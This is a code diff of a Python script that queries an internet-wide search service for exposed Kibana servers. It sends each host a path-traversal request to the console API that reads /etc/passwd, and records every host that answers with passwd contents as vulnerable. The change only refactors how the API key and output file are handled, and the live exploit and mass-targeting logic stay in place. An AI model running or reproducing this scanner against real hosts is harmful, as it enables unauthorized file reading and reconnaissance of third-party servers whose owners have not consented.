@@ -14,7 +14,13 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Configuration
-API_KEY = "YOURAPIKEY"
+import os
+import sys
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from common import get_api_key, open_output
+
+API_KEY = get_api_key()
 SEARCH_FOR = 'http.component:"kibana" port:"443" -country:cn,fr,se,es,sg'
 FILE = "/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../etc/passwd"
 session = requests.Session()
@@ -39,7 +45,7 @@ def grab_file (IP,PORT,FILE):
 		response = session.get(URL, headers=headers, timeout=15, verify=False)
 		result = response.text
 		if '/usr/sbin/nologin' in result:
-			text_file = open("./cfg/kib.cfg", "a")
+			text_file = open_output("cfg/kib.cfg", "a")
 			text_file.write("https://"+IP+":"+PORT+"\n")
 			text_file.close()
 			print ("[*] Kibana... Found [*]\n")
